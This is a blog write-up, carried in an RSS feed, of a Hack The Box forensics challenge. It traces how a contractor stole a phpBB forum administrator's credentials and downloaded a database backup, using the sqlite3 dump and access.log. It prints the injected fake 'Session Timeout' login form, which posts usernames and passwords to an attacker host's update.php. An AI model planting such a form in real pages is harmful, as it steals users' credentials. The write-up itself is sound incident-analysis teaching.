<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Sqlite3 on Shakil's Blog</title><link>https://hshakilst.github.io/tags/sqlite3/</link><description>Recent content in Sqlite3 on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Sat, 15 Jun 2024 03:54:17 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/sqlite3/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Sherlock Bumblebee</title><link>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</link><pubDate>Sat, 15 Jun 2024 03:54:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</guid><description><![CDATA[<h1 id="bumblebee-dfir">Bumblebee (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>bumblebee.zip</td>
<td>ba06e26779ead4b6299b6a188d11fc02</td>
<td>hackthebkue</td>
</tr>
<tr>
<td>incident.tgz</td>
<td>1b301c2fb2a1232758aca31588506edf</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li>SQLite Browser - For <code>phpbb.sqlite3</code> database analysis.</li>
<li>Linux Terminal - For <code>access.log</code> analysis.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p><strong>Analyzing SQLite3 Database</strong></p>
<p>The contractor&rsquo;s user information are listed below.
<img src="images/20240613104708.png" alt="User Info"></p>
<p>The contractor&rsquo;s post information for the forum are listed below.
<img src="images/20240613105158.png" alt="Post Info"></p>
<p>Post contents malicious part</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">--snip--</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;main&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h3</span>&gt;Session Timeout&lt;/<span style="color:#ff79c6">h3</span>&gt; &lt;<span style="color:#ff79c6">br</span> /&gt; &lt;<span style="color:#ff79c6">br</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;Your session token has timed out in order to proceed you must login again.&lt;/<span style="color:#ff79c6">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.10.0.78/update.php&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">data-focus</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">target</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hiddenframe&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login-title&#34;</span>&gt;Login&lt;/<span style="color:#ff79c6">h2</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">fieldset</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fields1&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span>&gt;Username:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span>&gt;Password:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span> <span style="color:#50fa7b">autocomplete</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;off&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;4&#34;</span>&gt;Remember me&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;5&#34;</span>&gt;Hide my online status this session&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&amp;nbsp;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt; &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;6&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button1&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sethidden()&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/fieldset class=&#34;fields1&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span></code></pre></div><p>At this point we have identified the malicious IP <code>10.10.0.78</code>, and was used to access the forum as well as staging a credential stealer namely <code>update.php</code>.</p>
<p>Browsing the <code>phpbb_log</code> table we found additional information when the contractor logged in as Administrator. The real Administrator&rsquo;s IP was <code>10.255.254.2</code>. Upon Investigating the <code>access.log</code> artifact we can verify their information like User-Agent, which URLs were visited to get a sense of baseline activity which are normal for an Administrator user.</p>
<p>Then we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.</p>
<p><strong>Analyzing <code>access.log</code></strong></p>
<p>An access.log file can have a vast volume of data it is recommended to use Splunk or ElasticSearch or any kind of SIEM tool to quickly find and triage information. But, in our case we have relatively small amount of data and we can use basic Linux commands to filter and search for the information we are looking for.</p>
<p>Filtering the access.log file is very helpful to find the actual data we are looking for. For example, we don&rsquo;t need the data when a page loads and request are made to load CSS, images, assets to render the UI.</p>
<p>We can easily filter those types of requests using <code>egrep</code>. The command for filtering assets related data is given below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span>
</span></span></code></pre></div><p>Here <code>-v</code> returns everything except the matching pattern.</p>
<p>Let&rsquo;s search for the legit Administrator&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.255.254.2 | head -n1
</span></span><span style="display:flex;"><span>10.255.254.2 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:08:42 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=12 HTTP/1.1&#34;</span> <span style="color:#bd93f9">403</span> <span style="color:#bd93f9">9412</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=1&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#34;</span>
</span></span></code></pre></div><p>Let&rsquo;s search for the adversary&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | head -n1 
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:07:39 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">4205</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#34;</span>
</span></span></code></pre></div><p>The contractor added himself to the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep POST
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:53:51 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;g=5 HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2623</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;action=list&amp;g=5&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The contractor also sent two requests to backup the database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>download            
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:22 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2463</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&amp;i=acp_database&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:24 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3771</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:30 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2474</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:56:28 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3770</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>And finally they downloaded the database backup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep .sql
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:12:01:38 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">34707</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The database backup file size was <code>34707</code> bytes (34.7 KB) in size.</p>
<h3 id="summary">Summary</h3>
<p>The contractor used his account to stage a phishing page in the internal forum of Forela. Then he stole the Administrator&rsquo;s credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the IP <code>10.10.0.78</code>. Then, they used the stolen Administrator credential created an account (apoole) for persistence. Then they backed up and downloaded the database.</p>
]]></description></item></channel></rss>